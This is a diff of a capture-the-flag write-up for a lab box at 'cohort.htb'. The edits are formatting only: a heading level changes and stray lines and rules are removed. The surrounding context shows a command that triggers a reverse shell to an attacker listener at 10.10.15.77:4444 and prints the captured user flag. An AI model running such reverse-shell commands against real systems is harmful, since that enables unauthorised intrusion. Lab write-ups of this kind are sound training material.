@@ -2164,7 +2164,7 @@ Command execution is established but not interactive. Start a listener and use t
 <br>
 </div>
 
-#### 3.14 — Obtain an interactive reverse shell and capture the user flag
+### 3.14 Obtain an interactive reverse shell and capture the user flag
 
 **Why this step:**  
 Command execution is confirmed but each invocation runs a single command and closes (3.13). Establish a persistent interactive shell for enumeration, then read the user flag.
@@ -2184,8 +2184,6 @@ bash
 # Terminal 2 — trigger the reverse shell:
 python3 shell.py https://nb-1be3782a8afd3ad5.cohort.htb --revshell 10.10.15.77 4444
 ```
-
-bash
 
 ```bash
 # In the caught shell — stabilise the TTY:
@@ -2225,8 +2223,6 @@ marimo@cohort:~$ cat user.txt
 52aa58a6a2556cc193fc04e0d1db8660
 ```
 
----
-
 #### 🚩 USER FLAG
 
 ```
@@ -2234,8 +2230,6 @@ marimo@cohort:~$ cat user.txt
 ```
 
 Captured as `marimo` (uid=1000) at `/home/marimo/user.txt`.
-
----
 
 **What this gives you:**
 
